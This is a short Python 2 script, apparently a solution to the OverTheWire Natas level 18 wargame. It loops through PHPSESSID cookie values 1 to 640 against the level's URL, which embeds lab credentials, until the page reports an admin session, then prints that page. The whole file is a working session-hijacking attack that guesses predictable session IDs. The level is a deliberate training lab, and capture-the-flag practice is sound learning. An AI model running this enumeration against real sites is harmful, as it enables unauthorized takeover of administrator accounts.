#Brute forcing admin session ID using the PHPSESSID cookie value
import requests;
dest = 'http://natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP@natas18.natas.labs.overthewire.org/index.php';

max = 640;

for i in range (0, 640) :
	id = i + 1;
	print 'Attempt: %s' % id;
	c = {'PHPSESSID' : str(id)};
	r = requests.get(dest,cookies=c);
	if (r.content.find('You are an admin.') > -1) :
		print 'Admin session ID is %s\nReturned content reads:\n' % id;
		print r.content;
		break;
